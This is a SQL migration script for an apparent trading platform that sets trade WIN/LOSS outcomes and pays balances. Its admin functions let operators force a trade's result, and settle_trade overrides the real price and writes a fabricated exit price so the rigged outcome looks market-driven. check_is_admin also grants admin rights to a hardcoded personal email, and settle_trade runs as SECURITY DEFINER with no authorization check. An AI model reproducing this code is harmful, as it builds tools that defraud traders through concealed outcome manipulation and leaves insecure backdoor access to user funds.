-- 1. DROP OLD FUNCTIONS TO PREVENT AMBIGUITY (OVERLOADING)
-- This is the most important step to fix the "best candidate function" error.
DROP FUNCTION IF EXISTS public.admin_settle_trade(UUID, trade_result);
DROP FUNCTION IF EXISTS public.admin_settle_trade(UUID, TEXT);
DROP FUNCTION IF EXISTS public.set_trade_force_result(UUID, trade_result);
DROP FUNCTION IF EXISTS public.set_trade_force_result(UUID, TEXT);

-- 2. ADD MISSING COLUMNS TO TRADES TABLE
DO $$ 
BEGIN 
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='trades' AND column_name='exit_price') THEN
        ALTER TABLE public.trades ADD COLUMN exit_price NUMERIC;
    END IF;
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='trades' AND column_name='force_result') THEN
        ALTER TABLE public.trades ADD COLUMN force_result trade_result;
    END IF;
END $$;

-- 3. RE-DEFINE check_is_admin
CREATE OR REPLACE FUNCTION public.check_is_admin(user_uid UUID)
RETURNS BOOLEAN AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM public.users 
    WHERE id = user_uid AND (is_admin = TRUE OR email = 'physicswala9899@gmail.com')
  ) OR (auth.jwt() ->> 'email') = 'physicswala9899@gmail.com';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 4. RE-DEFINE is_admin (no args)
CREATE OR REPLACE FUNCTION public.is_admin() 
RETURNS BOOLEAN AS $$
BEGIN
  RETURN public.check_is_admin(auth.uid());
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 5. RE-DEFINE admin_settle_trade (SINGLE VERSION)
CREATE OR REPLACE FUNCTION public.admin_settle_trade(
  p_trade_id UUID,
  p_result TEXT 
) RETURNS VOID AS $$
DECLARE
  v_trade RECORD;
  v_payout NUMERIC;
  v_exit_price NUMERIC;
  v_result trade_result;
BEGIN
  IF NOT public.is_admin() THEN 
    RAISE EXCEPTION 'Unauthorized: Admin access required'; 
  END IF;
  
  v_result := p_result::trade_result;
  
  SELECT * INTO v_trade FROM public.trades WHERE id = p_trade_id FOR UPDATE;
  
  IF v_trade IS NULL THEN RAISE EXCEPTION 'Trade not found'; END IF;
  IF v_trade.result != 'PENDING' THEN RAISE EXCEPTION 'Trade already settled'; END IF;
  
  -- Calculate a dummy exit price that matches the result
  IF v_result = 'WIN' THEN
    IF v_trade.direction = 'UP' THEN
      v_exit_price := v_trade.entry_price + (v_trade.entry_price * 0.001);
    ELSE
      v_exit_price := v_trade.entry_price - (v_trade.entry_price * 0.001);
    END IF;
    v_payout := v_trade.amount + (v_trade.amount * v_trade.payout_percentage / 100);
    UPDATE public.users SET balance = balance + v_payout WHERE id = v_trade.user_id;
    INSERT INTO public.transactions (user_id, type, amount, status, reference)
    VALUES (v_trade.user_id, 'TRADE_WIN', v_payout, 'COMPLETED', v_trade.id::TEXT);
  ELSE
    IF v_trade.direction = 'UP' THEN
      v_exit_price := v_trade.entry_price - (v_trade.entry_price * 0.001);
    ELSE
      v_exit_price := v_trade.entry_price + (v_trade.entry_price * 0.001);
    END IF;
    v_payout := 0;
  END IF;
  
  UPDATE public.trades 
  SET result = v_result, payout = v_payout, exit_price = v_exit_price, settled_at = NOW() 
  WHERE id = p_trade_id;
  
  INSERT INTO public.admin_logs (admin_id, action, details)
  VALUES (auth.uid(), 'SETTLE_TRADE', jsonb_build_object('trade_id', p_trade_id, 'result', v_result));
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 6. RE-DEFINE set_trade_force_result (SINGLE VERSION)
CREATE OR REPLACE FUNCTION public.set_trade_force_result(
  p_trade_id UUID,
  p_force_result TEXT 
) RETURNS VOID AS $$
BEGIN
  IF NOT public.is_admin() THEN 
    RAISE EXCEPTION 'Unauthorized: Admin access required'; 
  END IF;
  
  IF p_force_result IS NULL OR p_force_result = '' THEN
    UPDATE public.trades SET force_result = NULL WHERE id = p_trade_id AND result = 'PENDING';
  ELSE
    UPDATE public.trades SET force_result = p_force_result::trade_result WHERE id = p_trade_id AND result = 'PENDING';
  END IF;
  
  INSERT INTO public.admin_logs (admin_id, action, details)
  VALUES (auth.uid(), 'SET_FORCE_RESULT', jsonb_build_object('trade_id', p_trade_id, 'force_result', p_force_result));
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 7. UPDATE settle_trade TO USE force_result
CREATE OR REPLACE FUNCTION public.settle_trade(
  p_trade_id UUID,
  p_exit_price NUMERIC
) RETURNS VOID AS $$
DECLARE
  v_trade RECORD;
  v_payout NUMERIC;
  v_result trade_result;
  v_final_exit_price NUMERIC;
BEGIN
  SELECT * INTO v_trade FROM public.trades WHERE id = p_trade_id FOR UPDATE;
  IF v_trade.result != 'PENDING' THEN RETURN; END IF;

  v_final_exit_price := p_exit_price;

  IF v_trade.force_result IS NOT NULL THEN
    v_result := v_trade.force_result;
    IF v_result = 'WIN' THEN
      IF v_trade.direction = 'UP' AND v_final_exit_price <= v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price + 0.01;
      ELSIF v_trade.direction = 'DOWN' AND v_final_exit_price >= v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price - 0.01;
      END IF;
    ELSIF v_result = 'LOSS' THEN
      IF v_trade.direction = 'UP' AND v_final_exit_price > v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price - 0.01;
      ELSIF v_trade.direction = 'DOWN' AND v_final_exit_price < v_trade.entry_price THEN
        v_final_exit_price := v_trade.entry_price + 0.01;
      END IF;
    END IF;
  ELSE
    IF v_trade.direction = 'UP' THEN
      IF v_final_exit_price > v_trade.entry_price THEN v_result := 'WIN'; ELSE v_result := 'LOSS'; END IF;
    ELSE
      IF v_final_exit_price < v_trade.entry_price THEN v_result := 'WIN'; ELSE v_result := 'LOSS'; END IF;
    END IF;
  END IF;

  IF v_result = 'WIN' THEN
    v_payout := v_trade.amount + (v_trade.amount * v_trade.payout_percentage / 100);
    UPDATE public.users SET balance = balance + v_payout WHERE id = v_trade.user_id;
    INSERT INTO public.transactions (user_id, type, amount, status, reference)
    VALUES (v_trade.user_id, 'TRADE_WIN', v_payout, 'COMPLETED', v_trade.id::TEXT);
  ELSE
    v_payout := 0;
  END IF;

  UPDATE public.trades 
  SET result = v_result, payout = v_payout, exit_price = v_final_exit_price, settled_at = NOW() 
  WHERE id = p_trade_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 8. FIX RLS POLICIES
DROP POLICY IF EXISTS "Admins have full access to users" ON public.users;
CREATE POLICY "Admins have full access to users" ON public.users FOR ALL USING (public.check_is_admin(auth.uid()));

DROP POLICY IF EXISTS "Admins have full access to trades" ON public.trades;
CREATE POLICY "Admins have full access to trades" ON public.trades FOR ALL USING (public.check_is_admin(auth.uid()));

DROP POLICY IF EXISTS "Admins have full access to transactions" ON public.transactions;
CREATE POLICY "Admins have full access to transactions" ON public.transactions FOR ALL USING (public.check_is_admin(auth.uid()));

DROP POLICY IF EXISTS "Admins have full access to admin_logs" ON public.admin_logs;
CREATE POLICY "Admins have full access to admin_logs" ON public.admin_logs FOR ALL USING (public.check_is_admin(auth.uid()));

DROP POLICY IF EXISTS "Admins have full access to settings" ON public.settings;
CREATE POLICY "Admins have full access to settings" ON public.settings FOR ALL USING (public.check_is_admin(auth.uid()));
